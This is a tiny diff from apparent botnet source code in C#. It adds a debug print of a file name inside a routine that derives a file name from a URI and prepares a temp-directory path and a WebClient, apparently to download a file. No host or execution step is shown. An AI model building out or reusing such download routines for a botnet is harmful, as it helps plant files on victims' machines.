@@ -20,7 +20,7 @@ namespace Botnet
         {
             string file_name = Path.GetFileName(URI);
             string temp_path = Path.GetTempPath();
-
+            Console.WriteLine(file_name);
             string file_path = Path.Combine(temp_path, file_name);
 
             WebClient wc = new WebClient();
